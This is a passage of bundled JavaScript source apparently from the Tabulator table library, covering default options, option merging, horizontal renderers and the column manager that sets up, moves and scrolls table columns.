  FrozenColumnsModule: FrozenColumns,
  FrozenRowsModule: FrozenRows,
  GroupRowsModule: GroupRows,
  HistoryModule: History,
  HtmlTableImportModule: HtmlTableImport,
  ImportModule: Import,
  InteractionModule: Interaction,
  KeybindingsModule: Keybindings,
  MenuModule: Menu,
  MoveColumnsModule: MoveColumns,
  MoveRowsModule: MoveRows,
  MutatorModule: Mutator,
  PageModule: Page,
  PersistenceModule: Persistence,
  PopupModule: Popup2,
  PrintModule: Print,
  ReactiveDataModule: ReactiveData,
  ResizeColumnsModule: ResizeColumns,
  ResizeRowsModule: ResizeRows,
  ResizeTableModule: ResizeTable,
  ResponsiveLayoutModule: ResponsiveLayout,
  SelectRangeModule: SelectRange,
  SelectRowModule: SelectRow,
  SortModule: Sort,
  SpreadsheetModule: Spreadsheet,
  TooltipModule: Tooltip,
  ValidateModule: Validate
});
var defaultOptions = {
  debugEventsExternal: false,
  //flag to console log events
  debugEventsInternal: false,
  //flag to console log events
  debugInvalidOptions: true,
  //allow toggling of invalid option warnings
  debugInvalidComponentFuncs: true,
  //allow toggling of invalid component warnings
  debugInitialization: true,
  //allow toggling of pre initialization function call warnings
  debugDeprecation: true,
  //allow toggling of deprecation warnings
  height: false,
  //height of tabulator
  minHeight: false,
  //minimum height of tabulator
  maxHeight: false,
  //maximum height of tabulator
  columnHeaderVertAlign: "top",
  //vertical alignment of column headers
  popupContainer: false,
  columns: [],
  //store for colum header info
  columnDefaults: {},
  //store column default props
  rowHeader: false,
  data: false,
  //default starting data
  autoColumns: false,
  //build columns from data row structure
  autoColumnsDefinitions: false,
  nestedFieldSeparator: ".",
  //separator for nested data
  footerElement: false,
  //hold footer element
  index: "id",
  //filed for row index
  textDirection: "auto",
  addRowPos: "bottom",
  //position to insert blank rows, top|bottom
  headerVisible: true,
  //hide header
  renderVertical: "virtual",
  renderHorizontal: "basic",
  renderVerticalBuffer: 0,
  // set virtual DOM buffer size
  scrollToRowPosition: "top",
  scrollToRowIfVisible: true,
  scrollToColumnPosition: "left",
  scrollToColumnIfVisible: true,
  rowFormatter: false,
  rowFormatterPrint: null,
  rowFormatterClipboard: null,
  rowFormatterHtmlOutput: null,
  rowHeight: null,
  placeholder: false,
  dataLoader: true,
  dataLoaderLoading: false,
  dataLoaderError: false,
  dataLoaderErrorTimeout: 3e3,
  dataSendParams: {},
  dataReceiveParams: {},
  dependencies: {}
};
class OptionsList {
  constructor(table, msgType, defaults2 = {}) {
    this.table = table;
    this.msgType = msgType;
    this.registeredDefaults = Object.assign({}, defaults2);
  }
  register(option, value) {
    this.registeredDefaults[option] = value;
  }
  generate(defaultOptions2, userOptions = {}) {
    var output = Object.assign({}, this.registeredDefaults), warn2 = this.table.options.debugInvalidOptions || userOptions.debugInvalidOptions === true;
    Object.assign(output, defaultOptions2);
    for (let key in userOptions) {
      if (!output.hasOwnProperty(key)) {
        if (warn2) {
          console.warn("Invalid " + this.msgType + " option:", key);
        }
        output[key] = userOptions.key;
      }
    }
    for (let key in output) {
      if (key in userOptions) {
        output[key] = userOptions[key];
      } else {
        if (Array.isArray(output[key])) {
          output[key] = Object.assign([], output[key]);
        } else if (typeof output[key] === "object" && output[key] !== null) {
          output[key] = Object.assign({}, output[key]);
        } else if (typeof output[key] === "undefined") {
          delete output[key];
        }
      }
    }
    return output;
  }
}
class Renderer extends CoreFeature {
  constructor(table) {
    super(table);
    this.elementVertical = table.rowManager.element;
    this.elementHorizontal = table.columnManager.element;
    this.tableElement = table.rowManager.tableElement;
    this.verticalFillMode = "fit";
  }
  ///////////////////////////////////
  /////// Internal Bindings /////////
  ///////////////////////////////////
  initialize() {
  }
  clearRows() {
  }
  clearColumns() {
  }
  reinitializeColumnWidths(columns) {
  }
  renderRows() {
  }
  renderColumns() {
  }
  rerenderRows(callback) {
    if (callback) {
      callback();
    }
  }
  rerenderColumns(update2, blockRedraw) {
  }
  renderRowCells(row) {
  }
  rerenderRowCells(row, force) {
  }
  scrollColumns(left2, dir) {
  }
  scrollRows(top2, dir) {
  }
  resize() {
  }
  scrollToRow(row) {
  }
  scrollToRowNearestTop(row) {
  }
  visibleRows(includingBuffer) {
    return [];
  }
  ///////////////////////////////////
  //////// Helper Functions /////////
  ///////////////////////////////////
  rows() {
    return this.table.rowManager.getDisplayRows();
  }
  styleRow(row, index) {
    var rowEl = row.getElement();
    if (index % 2) {
      rowEl.classList.add("tabulator-row-even");
      rowEl.classList.remove("tabulator-row-odd");
    } else {
      rowEl.classList.add("tabulator-row-odd");
      rowEl.classList.remove("tabulator-row-even");
    }
  }
  ///////////////////////////////////
  /////// External Triggers /////////
  /////// (DO NOT OVERRIDE) /////////
  ///////////////////////////////////
  clear() {
    this.clearRows();
    this.clearColumns();
  }
  render() {
    this.renderRows();
    this.renderColumns();
  }
  rerender(callback) {
    this.rerenderRows();
    this.rerenderColumns();
  }
  scrollToRowPosition(row, position, ifVisible) {
    var rowIndex = this.rows().indexOf(row), rowEl = row.getElement(), offset2 = 0;
    return new Promise((resolve, reject) => {
      if (rowIndex > -1) {
        if (typeof ifVisible === "undefined") {
          ifVisible = this.table.options.scrollToRowIfVisible;
        }
        if (!ifVisible) {
          if (Helpers.elVisible(rowEl)) {
            offset2 = Helpers.elOffset(rowEl).top - Helpers.elOffset(this.elementVertical).top;
            if (offset2 > 0 && offset2 < this.elementVertical.clientHeight - rowEl.offsetHeight) {
              resolve();
              return false;
            }
          }
        }
        if (typeof position === "undefined") {
          position = this.table.options.scrollToRowPosition;
        }
        if (position === "nearest") {
          position = this.scrollToRowNearestTop(row) ? "top" : "bottom";
        }
        this.scrollToRow(row);
        switch (position) {
          case "middle":
          case "center":
            if (this.elementVertical.scrollHeight - this.elementVertical.scrollTop == this.elementVertical.clientHeight) {
              this.elementVertical.scrollTop = this.elementVertical.scrollTop + (rowEl.offsetTop - this.elementVertical.scrollTop) - (this.elementVertical.scrollHeight - rowEl.offsetTop) / 2;
            } else {
              this.elementVertical.scrollTop = this.elementVertical.scrollTop - this.elementVertical.clientHeight / 2;
            }
            break;
          case "bottom":
            if (this.elementVertical.scrollHeight - this.elementVertical.scrollTop == this.elementVertical.clientHeight) {
              this.elementVertical.scrollTop = this.elementVertical.scrollTop - (this.elementVertical.scrollHeight - rowEl.offsetTop) + rowEl.offsetHeight;
            } else {
              this.elementVertical.scrollTop = this.elementVertical.scrollTop - this.elementVertical.clientHeight + rowEl.offsetHeight;
            }
            break;
          case "top":
            this.elementVertical.scrollTop = rowEl.offsetTop;
            break;
        }
        resolve();
      } else {
        console.warn("Scroll Error - Row not visible");
        reject("Scroll Error - Row not visible");
      }
    });
  }
}
class BasicHorizontal extends Renderer {
  constructor(table) {
    super(table);
  }
  renderRowCells(row, inFragment) {
    const rowFrag = document.createDocumentFragment();
    row.cells.forEach((cell) => {
      rowFrag.appendChild(cell.getElement());
    });
    row.element.appendChild(rowFrag);
    if (!inFragment) {
      row.cells.forEach((cell) => {
        cell.cellRendered();
      });
    }
  }
  reinitializeColumnWidths(columns) {
    columns.forEach(function(column) {
      column.reinitializeWidth();
    });
  }
}
class VirtualDomHorizontal extends Renderer {
  constructor(table) {
    super(table);
    this.leftCol = 0;
    this.rightCol = 0;
    this.scrollLeft = 0;
    this.vDomScrollPosLeft = 0;
    this.vDomScrollPosRight = 0;
    this.vDomPadLeft = 0;
    this.vDomPadRight = 0;
    this.fitDataColAvg = 0;
    this.windowBuffer = 200;
    this.visibleRows = null;
    this.initialized = false;
    this.isFitData = false;
    this.columns = [];
  }
  initialize() {
    this.compatibilityCheck();
    this.layoutCheck();
    this.vertScrollListen();
  }
  compatibilityCheck() {
    if (this.options("layout") == "fitDataTable") {
      console.warn("Horizontal Virtual DOM is not compatible with fitDataTable layout mode");
    }
    if (this.options("responsiveLayout")) {
      console.warn("Horizontal Virtual DOM is not compatible with responsive columns");
    }
    if (this.options("rtl")) {
      console.warn("Horizontal Virtual DOM is not currently compatible with RTL text direction");
    }
  }
  layoutCheck() {
    this.isFitData = this.options("layout").startsWith("fitData");
  }
  vertScrollListen() {
    this.subscribe("scroll-vertical", this.clearVisRowCache.bind(this));
    this.subscribe("data-refreshed", this.clearVisRowCache.bind(this));
  }
  clearVisRowCache() {
    this.visibleRows = null;
  }
  //////////////////////////////////////
  ///////// Public Functions ///////////
  //////////////////////////////////////
  renderColumns(row, force) {
    this.dataChange();
  }
  scrollColumns(left2, dir) {
    if (this.scrollLeft != left2) {
      this.scrollLeft = left2;
      this.scroll(left2 - (this.vDomScrollPosLeft + this.windowBuffer));
    }
  }
  calcWindowBuffer() {
    var buffer = this.elementVertical.clientWidth;
    this.table.columnManager.columnsByIndex.forEach((column) => {
      if (column.visible) {
        var width = column.getWidth();
        if (width > buffer) {
          buffer = width;
        }
      }
    });
    this.windowBuffer = buffer * 2;
  }
  rerenderColumns(update2, blockRedraw) {
    var old = {
      cols: this.columns,
      leftCol: this.leftCol,
      rightCol: this.rightCol
    }, colPos = 0;
    if (update2 && !this.initialized) {
      return;
    }
    this.clear();
    this.calcWindowBuffer();
    this.scrollLeft = this.elementVertical.scrollLeft;
    this.vDomScrollPosLeft = this.scrollLeft - this.windowBuffer;
    this.vDomScrollPosRight = this.scrollLeft + this.elementVertical.clientWidth + this.windowBuffer;
    this.table.columnManager.columnsByIndex.forEach((column) => {
      var config = {}, width;
      if (column.visible) {
        if (!column.modules.frozen) {
          width = column.getWidth();
          config.leftPos = colPos;
          config.rightPos = colPos + width;
          config.width = width;
          if (this.isFitData) {
            config.fitDataCheck = column.modules.vdomHoz ? column.modules.vdomHoz.fitDataCheck : true;
          }
          if (colPos + width > this.vDomScrollPosLeft && colPos < this.vDomScrollPosRight) {
            if (this.leftCol == -1) {
              this.leftCol = this.columns.length;
              this.vDomPadLeft = colPos;
            }
            this.rightCol = this.columns.length;
          } else {
            if (this.leftCol !== -1) {
              this.vDomPadRight += width;
            }
          }
          this.columns.push(column);
          column.modules.vdomHoz = config;
          colPos += width;
        }
      }
    });
    this.tableElement.style.paddingLeft = this.vDomPadLeft + "px";
    this.tableElement.style.paddingRight = this.vDomPadRight + "px";
    this.initialized = true;
    if (!blockRedraw) {
      if (!update2 || this.reinitChanged(old)) {
        this.reinitializeRows();
      }
    }
    this.elementVertical.scrollLeft = this.scrollLeft;
  }
  renderRowCells(row) {
    if (this.initialized) {
      this.initializeRow(row);
    } else {
      const rowFrag = document.createDocumentFragment();
      row.cells.forEach((cell) => {
        rowFrag.appendChild(cell.getElement());
      });
      row.element.appendChild(rowFrag);
      row.cells.forEach((cell) => {
        cell.cellRendered();
      });
    }
  }
  rerenderRowCells(row, force) {
    this.reinitializeRow(row, force);
  }
  reinitializeColumnWidths(columns) {
    for (let i2 = this.leftCol; i2 <= this.rightCol; i2++) {
      this.columns[i2].reinitializeWidth();
    }
  }
  //////////////////////////////////////
  //////// Internal Rendering //////////
  //////////////////////////////////////
  deinitialize() {
    this.initialized = false;
  }
  clear() {
    this.columns = [];
    this.leftCol = -1;
    this.rightCol = 0;
    this.vDomScrollPosLeft = 0;
    this.vDomScrollPosRight = 0;
    this.vDomPadLeft = 0;
    this.vDomPadRight = 0;
  }
  dataChange() {
    var change = false, row, rowEl;
    if (this.isFitData) {
      this.table.columnManager.columnsByIndex.forEach((column) => {
        if (!column.definition.width && column.visible) {
          change = true;
        }
      });
      if (change && this.table.rowManager.getDisplayRows().length) {
        this.vDomScrollPosRight = this.scrollLeft + this.elementVertical.clientWidth + this.windowBuffer;
        row = this.chain("rows-sample", [1], [], () => {
          return this.table.rowManager.getDisplayRows();
        })[0];
        if (row) {
          rowEl = row.getElement();
          row.generateCells();
          this.tableElement.appendChild(rowEl);
          for (let colEnd = 0; colEnd < row.cells.length; colEnd++) {
            let cell = row.cells[colEnd];
            rowEl.appendChild(cell.getElement());
            cell.column.reinitializeWidth();
          }
          rowEl.parentNode.removeChild(rowEl);
          this.rerenderColumns(false, true);
        }
      }
    } else {
      if (this.options("layout") === "fitColumns") {
        this.layoutRefresh();
        this.rerenderColumns(false, true);
      }
    }
  }
  reinitChanged(old) {
    var match2 = true;
    if (old.cols.length !== this.columns.length || old.leftCol !== this.leftCol || old.rightCol !== this.rightCol) {
      return true;
    }
    old.cols.forEach((col, i2) => {
      if (col !== this.columns[i2]) {
        match2 = false;
      }
    });
    return !match2;
  }
  reinitializeRows() {
    var visibleRows = this.getVisibleRows(), otherRows = this.table.rowManager.getRows().filter((row) => !visibleRows.includes(row));
    visibleRows.forEach((row) => {
      this.reinitializeRow(row, true);
    });
    otherRows.forEach((row) => {
      row.deinitialize();
    });
  }
  getVisibleRows() {
    if (!this.visibleRows) {
      this.visibleRows = this.table.rowManager.getVisibleRows();
    }
    return this.visibleRows;
  }
  scroll(diff2) {
    this.vDomScrollPosLeft += diff2;
    this.vDomScrollPosRight += diff2;
    if (Math.abs(diff2) > this.windowBuffer / 2) {
      this.rerenderColumns();
    } else {
      if (diff2 > 0) {
        this.addColRight();
        this.removeColLeft();
      } else {
        this.addColLeft();
        this.removeColRight();
      }
    }
  }
  colPositionAdjust(start2, end2, diff2) {
    for (let i2 = start2; i2 < end2; i2++) {
      let column = this.columns[i2];
      column.modules.vdomHoz.leftPos += diff2;
      column.modules.vdomHoz.rightPos += diff2;
    }
  }
  addColRight() {
    var changes = false, working = true;
    while (working) {
      let column = this.columns[this.rightCol + 1];
      if (column) {
        if (column.modules.vdomHoz.leftPos <= this.vDomScrollPosRight) {
          changes = true;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              var cell = row.getCell(column);
              row.getElement().insertBefore(cell.getElement(), row.getCell(this.columns[this.rightCol]).getElement().nextSibling);
              cell.cellRendered();
            }
          });
          this.fitDataColActualWidthCheck(column);
          this.rightCol++;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              row.modules.vdomHoz.rightCol = this.rightCol;
            }
          });
          if (this.rightCol >= this.columns.length - 1) {
            this.vDomPadRight = 0;
          } else {
            this.vDomPadRight -= column.getWidth();
          }
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    if (changes) {
      this.tableElement.style.paddingRight = this.vDomPadRight + "px";
    }
  }
  addColLeft() {
    var changes = false, working = true;
    while (working) {
      let column = this.columns[this.leftCol - 1];
      if (column) {
        if (column.modules.vdomHoz.rightPos >= this.vDomScrollPosLeft) {
          changes = true;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              var cell = row.getCell(column);
              row.getElement().insertBefore(cell.getElement(), row.getCell(this.columns[this.leftCol]).getElement());
              cell.cellRendered();
            }
          });
          this.leftCol--;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              row.modules.vdomHoz.leftCol = this.leftCol;
            }
          });
          if (this.leftCol <= 0) {
            this.vDomPadLeft = 0;
          } else {
            this.vDomPadLeft -= column.getWidth();
          }
          let diff2 = this.fitDataColActualWidthCheck(column);
          if (diff2) {
            this.scrollLeft = this.elementVertical.scrollLeft = this.elementVertical.scrollLeft + diff2;
            this.vDomPadRight -= diff2;
          }
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    if (changes) {
      this.tableElement.style.paddingLeft = this.vDomPadLeft + "px";
    }
  }
  removeColRight() {
    var changes = false, working = true;
    while (working) {
      let column = this.columns[this.rightCol];
      if (column) {
        if (column.modules.vdomHoz.leftPos > this.vDomScrollPosRight) {
          changes = true;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              var cell = row.getCell(column);
              try {
                row.getElement().removeChild(cell.getElement());
              } catch (ex) {
                console.warn("Could not removeColRight", ex.message);
              }
            }
          });
          this.vDomPadRight += column.getWidth();
          this.rightCol--;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              row.modules.vdomHoz.rightCol = this.rightCol;
            }
          });
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    if (changes) {
      this.tableElement.style.paddingRight = this.vDomPadRight + "px";
    }
  }
  removeColLeft() {
    var changes = false, working = true;
    while (working) {
      let column = this.columns[this.leftCol];
      if (column) {
        if (column.modules.vdomHoz.rightPos < this.vDomScrollPosLeft) {
          changes = true;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              var cell = row.getCell(column);
              try {
                row.getElement().removeChild(cell.getElement());
              } catch (ex) {
                console.warn("Could not removeColLeft", ex.message);
              }
            }
          });
          this.vDomPadLeft += column.getWidth();
          this.leftCol++;
          this.getVisibleRows().forEach((row) => {
            if (row.type !== "group") {
              row.modules.vdomHoz.leftCol = this.leftCol;
            }
          });
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    if (changes) {
      this.tableElement.style.paddingLeft = this.vDomPadLeft + "px";
    }
  }
  fitDataColActualWidthCheck(column) {
    var newWidth, widthDiff;
    if (column.modules.vdomHoz.fitDataCheck) {
      column.reinitializeWidth();
      newWidth = column.getWidth();
      widthDiff = newWidth - column.modules.vdomHoz.width;
      if (widthDiff) {
        column.modules.vdomHoz.rightPos += widthDiff;
        column.modules.vdomHoz.width = newWidth;
        this.colPositionAdjust(this.columns.indexOf(column) + 1, this.columns.length, widthDiff);
      }
      column.modules.vdomHoz.fitDataCheck = false;
    }
    return widthDiff;
  }
  initializeRow(row) {
    if (row.type !== "group") {
      row.modules.vdomHoz = {
        leftCol: this.leftCol,
        rightCol: this.rightCol
      };
      if (this.table.modules.frozenColumns) {
        this.table.modules.frozenColumns.leftColumns.forEach((column) => {
          this.appendCell(row, column);
        });
      }
      for (let i2 = this.leftCol; i2 <= this.rightCol; i2++) {
        this.appendCell(row, this.columns[i2]);
      }
      if (this.table.modules.frozenColumns) {
        this.table.modules.frozenColumns.rightColumns.forEach((column) => {
          this.appendCell(row, column);
        });
      }
    }
  }
  appendCell(row, column) {
    if (column && column.visible) {
      let cell = row.getCell(column);
      row.getElement().appendChild(cell.getElement());
      cell.cellRendered();
    }
  }
  reinitializeRow(row, force) {
    if (row.type !== "group") {
      if (force || !row.modules.vdomHoz || row.modules.vdomHoz.leftCol !== this.leftCol || row.modules.vdomHoz.rightCol !== this.rightCol) {
        var rowEl = row.getElement();
        while (rowEl.firstChild) rowEl.removeChild(rowEl.firstChild);
        this.initializeRow(row);
      }
    }
  }
}
class ColumnManager extends CoreFeature {
  constructor(table) {
    super(table);
    this.blockHozScrollEvent = false;
    this.headersElement = null;
    this.contentsElement = null;
    this.rowHeader = null;
    this.element = null;
    this.columns = [];
    this.columnsByIndex = [];
    this.columnsByField = {};
    this.scrollLeft = 0;
    this.optionsList = new OptionsList(this.table, "column definition", defaultColumnOptions);
    this.redrawBlock = false;
    this.redrawBlockUpdate = null;
    this.renderer = null;
  }
  ////////////// Setup Functions /////////////////
  initialize() {
    this.initializeRenderer();
    this.headersElement = this.createHeadersElement();
    this.contentsElement = this.createHeaderContentsElement();
    this.element = this.createHeaderElement();
    this.contentsElement.insertBefore(this.headersElement, this.contentsElement.firstChild);
    this.element.insertBefore(this.contentsElement, this.element.firstChild);
    this.initializeScrollWheelWatcher();
    this.subscribe("scroll-horizontal", this.scrollHorizontal.bind(this));
    this.subscribe("scrollbar-vertical", this.padVerticalScrollbar.bind(this));
  }
  padVerticalScrollbar(width) {
    if (this.table.rtl) {
      this.headersElement.style.marginLeft = width + "px";
    } else {
      this.headersElement.style.marginRight = width + "px";
    }
  }
  initializeRenderer() {
    var renderClass;
    var renderers = {
      "virtual": VirtualDomHorizontal,
      "basic": BasicHorizontal
    };
    if (typeof this.table.options.renderHorizontal === "string") {
      renderClass = renderers[this.table.options.renderHorizontal];
    } else {
      renderClass = this.table.options.renderHorizontal;
    }
    if (renderClass) {
      this.renderer = new renderClass(this.table, this.element, this.tableElement);
      this.renderer.initialize();
    } else {
      console.error("Unable to find matching renderer:", this.table.options.renderHorizontal);
    }
  }
  createHeadersElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-headers");
    el.setAttribute("role", "row");
    return el;
  }
  createHeaderContentsElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-header-contents");
    el.setAttribute("role", "rowgroup");
    return el;
  }
  createHeaderElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-header");
    el.setAttribute("role", "rowgroup");
    if (!this.table.options.headerVisible) {
      el.classList.add("tabulator-header-hidden");
    }
    return el;
  }
  //return containing element
  getElement() {
    return this.element;
  }
  //return containing contents element
  getContentsElement() {
    return this.contentsElement;
  }
  //return header containing element
  getHeadersElement() {
    return this.headersElement;
  }
  //scroll horizontally to match table body
  scrollHorizontal(left2) {
    this.contentsElement.scrollLeft = left2;
    this.scrollLeft = left2;
    this.renderer.scrollColumns(left2);
  }
  initializeScrollWheelWatcher() {
    this.contentsElement.addEventListener("wheel", (e2) => {
      var left2;
      if (e2.deltaX) {
        left2 = this.contentsElement.scrollLeft + e2.deltaX;
        this.table.rowManager.scrollHorizontal(left2);
        this.table.columnManager.scrollHorizontal(left2);
      }
    });
  }
  ///////////// Column Setup Functions /////////////
  generateColumnsFromRowData(data) {
    var cols = [], collProgress = {}, rowSample = this.table.options.autoColumns === "full" ? data : [data[0]], definitions = this.table.options.autoColumnsDefinitions;
    if (data && data.length) {
      rowSample.forEach((row) => {
        Object.keys(row).forEach((key, index) => {
          let value = row[key], col;
          if (!collProgress[key]) {
            col = {
              field: key,
              title: key,
              sorter: this.calculateSorterFromValue(value)
            };
            cols.splice(index, 0, col);
            collProgress[key] = typeof value === "undefined" ? col : true;
          } else if (collProgress[key] !== true) {
            if (typeof value !== "undefined") {
              collProgress[key].sorter = this.calculateSorterFromValue(value);
              collProgress[key] = true;
            }
          }
        });
      });
      if (definitions) {
        switch (typeof definitions) {
          case "function":
            this.table.options.columns = definitions.call(this.table, cols);
            break;
          case "object":
            if (Array.isArray(definitions)) {
              cols.forEach((col) => {
                var match2 = definitions.find((def) => {
                  return def.field === col.field;
                });
                if (match2) {
                  Object.assign(col, match2);
                }
              });
            } else {
              cols.forEach((col) => {
                if (definitions[col.field]) {
                  Object.assign(col, definitions[col.field]);
                }
              });
            }
            this.table.options.columns = cols;
            break;
        }
      } else {
        this.table.options.columns = cols;
      }
      this.setColumns(this.table.options.columns);
    }
  }
  calculateSorterFromValue(value) {
    var sorter;
    switch (typeof value) {
      case "undefined":
        sorter = "string";
        break;
      case "boolean":
        sorter = "boolean";
        break;
      case "number":
        sorter = "number";
        break;
      case "object":
        if (Array.isArray(value)) {
          sorter = "array";
        } else {
          sorter = "string";
        }
        break;
      default:
        if (!isNaN(value) && value !== "") {
          sorter = "number";
        } else {
          if (value.match(/((^[0-9]+[a-z]+)|(^[a-z]+[0-9]+))+$/i)) {
            sorter = "alphanum";
          } else {
            sorter = "string";
          }
        }
        break;
    }
    return sorter;
  }
  setColumns(cols, row) {
    while (this.headersElement.firstChild) this.headersElement.removeChild(this.headersElement.firstChild);
    this.columns = [];
    this.columnsByIndex = [];
    this.columnsByField = {};
    this.dispatch("columns-loading");
    this.dispatchExternal("columnsLoading");
    if (this.table.options.rowHeader) {
      this.rowHeader = new Column(this.table.options.rowHeader === true ? {} : this.table.options.rowHeader, this, true);
      this.columns.push(this.rowHeader);
      this.headersElement.appendChild(this.rowHeader.getElement());
      this.rowHeader.columnRendered();
    }
    cols.forEach((def, i2) => {
      this._addColumn(def);
    });
    this._reIndexColumns();
    this.dispatch("columns-loaded");
    if (this.subscribedExternal("columnsLoaded")) {
      this.dispatchExternal("columnsLoaded", this.getComponents());
    }
    this.rerenderColumns(false, true);
    this.redraw(true);
  }
  _addColumn(definition, before, nextToColumn) {
    var column = new Column(definition, this), colEl = column.getElement(), index = nextToColumn ? this.findColumnIndex(nextToColumn) : nextToColumn;
    if (before && this.rowHeader && (!nextToColumn || nextToColumn === this.rowHeader)) {
      before = false;
      nextToColumn = this.rowHeader;
      index = 0;
    }
    if (nextToColumn && index > -1) {
      var topColumn = nextToColumn.getTopColumn();
      var parentIndex = this.columns.indexOf(topColumn);
      var nextEl = topColumn.getElement();
      if (before) {
        this.columns.splice(parentIndex, 0, column);
        nextEl.parentNode.insertBefore(colEl, nextEl);
      } else {
        this.columns.splice(parentIndex + 1, 0, column);
        nextEl.parentNode.insertBefore(colEl, nextEl.nextSibling);
      }
    } else {
      if (before) {
        this.columns.unshift(column);
        this.headersElement.insertBefore(column.getElement(), this.headersElement.firstChild);
      } else {
        this.columns.push(column);
        this.headersElement.appendChild(column.getElement());
      }
    }
    column.columnRendered();
    return column;
  }
  registerColumnField(col) {
    if (col.definition.field) {
      this.columnsByField[col.definition.field] = col;
    }
  }
  registerColumnPosition(col) {
    this.columnsByIndex.push(col);
  }
  _reIndexColumns() {
    this.columnsByIndex = [];
    this.columns.forEach(function(column) {
      column.reRegisterPosition();
    });
  }
  //ensure column headers take up the correct amount of space in column groups
  verticalAlignHeaders() {
    var minHeight = 0;
    if (!this.redrawBlock) {
      this.headersElement.style.height = "";
      this.columns.forEach((column) => {
        column.clearVerticalAlign();
      });
      this.columns.forEach((column) => {
        var height = column.getHeight();
        if (height > minHeight) {
          minHeight = height;
        }
      });
      this.headersElement.style.height = minHeight + "px";
      this.columns.forEach((column) => {
        column.verticalAlign(this.table.options.columnHeaderVertAlign, minHeight);
      });
      this.table.rowManager.adjustTableSize();
    }
  }
  //////////////// Column Details /////////////////
  findColumn(subject) {
    var columns;
    if (typeof subject == "object") {
      if (subject instanceof Column) {
        return subject;
      } else if (subject instanceof ColumnComponent) {
        return subject._getSelf() || false;
      } else if (typeof HTMLElement !== "undefined" && subject instanceof HTMLElement) {
        columns = [];
        this.columns.forEach((column) => {
          columns.push(column);
          columns = columns.concat(column.getColumns(true));
        });
        let match2 = columns.find((column) => {
          return column.element === subject;
        });
        return match2 || false;
      }
    } else {
      return this.columnsByField[subject] || false;
    }
    return false;
  }
  getColumnByField(field) {
    return this.columnsByField[field];
  }
  getColumnsByFieldRoot(root) {
    var matches = [];
    Object.keys(this.columnsByField).forEach((field) => {
      var fieldRoot = this.table.options.nestedFieldSeparator ? field.split(this.table.options.nestedFieldSeparator)[0] : field;
      if (fieldRoot === root) {
        matches.push(this.columnsByField[field]);
      }
    });
    return matches;
  }
  getColumnByIndex(index) {
    return this.columnsByIndex[index];
  }
  getFirstVisibleColumn() {
    var index = this.columnsByIndex.findIndex((col) => {
      return col.visible;
    });
    return index > -1 ? this.columnsByIndex[index] : false;
  }
  getVisibleColumnsByIndex() {
    return this.columnsByIndex.filter((col) => col.visible);
  }
  getColumns() {
    return this.columns;
  }
  findColumnIndex(column) {
    return this.columnsByIndex.findIndex((col) => {
      return column === col;
    });
  }
  //return all columns that are not groups
  getRealColumns() {
    return this.columnsByIndex;
  }
  //traverse across columns and call action
  traverse(callback) {
    this.columnsByIndex.forEach((column, i2) => {
      callback(column, i2);
    });
  }
  //get definitions of actual columns
  getDefinitions(active) {
    var output = [];
    this.columnsByIndex.forEach((column) => {
      if (!active || active && column.visible) {
        output.push(column.getDefinition());
      }
    });
    return output;
  }
  //get full nested definition tree
  getDefinitionTree() {
    var output = [];
    this.columns.forEach((column) => {
      output.push(column.getDefinition(true));
    });
    return output;
  }
  getComponents(structured) {
    var output = [], columns = structured ? this.columns : this.columnsByIndex;
    columns.forEach((column) => {
      output.push(column.getComponent());
    });
    return output;
  }
  getWidth() {
    var width = 0;
    this.columnsByIndex.forEach((column) => {
      if (column.visible) {
        width += column.getWidth();
      }
    });
    return width;
  }
  moveColumn(from, to, after) {
    to.element.parentNode.insertBefore(from.element, to.element);
    if (after) {
      to.element.parentNode.insertBefore(to.element, from.element);
    }
    this.moveColumnActual(from, to, after);
    this.verticalAlignHeaders();
    this.table.rowManager.reinitialize();
  }
  moveColumnActual(from, to, after) {
    if (from.parent.isGroup) {
      this._moveColumnInArray(from.parent.columns, from, to, after);
    } else {
      this._moveColumnInArray(this.columns, from, to, after);
    }
    this._moveColumnInArray(this.columnsByIndex, from, to, after, true);
    this.rerenderColumns(true);
    this.dispatch("column-moved", from, to, after);
    if (this.subscribedExternal("columnMoved")) {
      this.dispatchExternal("columnMoved", from.getComponent(), this.table.columnManager.getComponents());
    }
  }
  _moveColumnInArray(columns, from, to, after, updateRows) {
    var fromIndex = columns.indexOf(from), toIndex, rows2 = [];
    if (fromIndex > -1) {
      columns.splice(fromIndex, 1);
      toIndex = columns.indexOf(to);
      if (toIndex > -1) {
        if (after) {
          toIndex = toIndex + 1;
        }
      } else {
        toIndex = fromIndex;
      }
      columns.splice(toIndex, 0, from);
      if (updateRows) {
        rows2 = this.chain("column-moving-rows", [from, to, after], null, []) || [];
        rows2 = rows2.concat(this.table.rowManager.rows);
        rows2.forEach(function(row) {
          if (row.cells.length) {
            var cell = row.cells.splice(fromIndex, 1)[0];
            row.cells.splice(toIndex, 0, cell);
          }
        });
      }
    }
  }
  scrollToColumn(column, position, ifVisible) {
    var left2 = 0, offset2 = column.getLeftOffset(), adjust = 0, colEl = column.getElement();
    return new Promise((resolve, reject) => {
      if (typeof position === "undefined") {
        position = this.table.options.scrollToColumnPosition;
      }
      if (typeof ifVisible === "undefined") {
        ifVisible = this.table.options.scrollToColumnIfVisible;
      }
      if (column.visible) {
        switch (position) {
          case "middle":
          case "center":
            adjust = -this.element.clientWidth / 2;
            break;
          case "right":
            adjust = colEl.clientWidth - this.headersElement.clientWidth;
            break;
        }
        if (!ifVisible) {
          if (offset2 > 0 && offset2 + colEl.offsetWidth < this.element.clientWidth) {
            return false;
          }
        }
        left2 = offset2 + adjust;
        left2 = Math.max(Math.min(left2, this.table.rowManager.element.scrollWidth - this.table.rowManager.element.clientWidth), 0);
        this.table.rowManager.scrollHorizontal(left2);
        this.scrollHorizontal(left2);
        resolve();
      } else {
        console.warn("Scroll Error - Column not visible");
        reject("Scroll Error - Column not visible");
      }
    });
  }
  //////////////// Cell Management /////////////////
  generateCells(row) {
